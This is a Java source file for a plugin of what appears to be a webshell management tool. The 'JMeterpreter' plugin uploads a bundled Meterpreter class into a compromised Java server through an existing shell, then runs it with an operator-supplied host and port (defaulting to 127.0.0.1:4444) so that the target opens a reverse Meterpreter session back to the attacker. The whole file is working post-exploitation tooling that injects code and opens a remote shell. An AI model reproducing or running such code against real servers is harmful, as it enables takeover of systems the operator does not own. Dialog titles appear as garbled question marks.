package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.InputStream;

@PluginnAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "JMeterpreter"
)
public class Meterpreter implements Plugin {
    private static final String CLASS_NAME = "plugin.Meterpreter";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final RTextArea tipTextArea = new RTextArea();
    private final JButton goButton = new JButton("Go");
    private final JButton loadButton = new JButton("Load");
    private final JLabel hostLabel = new JLabel("host :");
    private final JLabel portLabel = new JLabel("port :");
    private final JTextField hostTextField = new JTextField("127.0.0.1", 15);
    private final JTextField portTextField = new JTextField("4444", 7);
    private final JSplitPane meterpreterSplitPane = new JSplitPane();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public Meterpreter() {
        this.meterpreterSplitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.loadButton);
        meterpreterTopPanel.add(this.goButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.initTip();
        this.panel.add(this.meterpreterSplitPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/Meterpreter.class");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include("plugin.Meterpreter", data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "??????", JOptionPane.INFORMATION_MESSAGE);
                } else {
                    JOptionPane.showMessageDialog(this.panel, "Load fail", "??????", JOptionPane.WARNING_MESSAGE);
                }
            } catch (Exception var4) {
                Log.error(var4);
                JOptionPane.showMessageDialog(this.panel, var4.getMessage(), "??????", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "??????", JOptionPane.INFORMATION_MESSAGE);
        }

    }

    private void goButtonClick(ActionEvent actionEvent) {
        String host = this.hostTextField.getText().trim();
        String port = this.portTextField.getText().trim();
        ReqParameter reqParamete = new ReqParameter();
        reqParamete.add("host", host);
        reqParamete.add("port", port);
        byte[] result = this.payload.evalFunc("plugin.Meterpreter", "run", reqParamete);
        String resultString = this.encoding.Decoding(result);
        Log.log(resultString);
        JOptionPane.showMessageDialog(this.panel, resultString, "??????", JOptionPane.INFORMATION_MESSAGE);
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void initTip() {
        try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/meterpreterTip.txt");
            this.tipTextArea.setText(new String(functions.readInputStream(inputStream)));
            inputStream.close();
        } catch (Exception var2) {
            Log.error(var2);
        }

    }

    public JPanel getView() {
        return this.panel;
    }
}
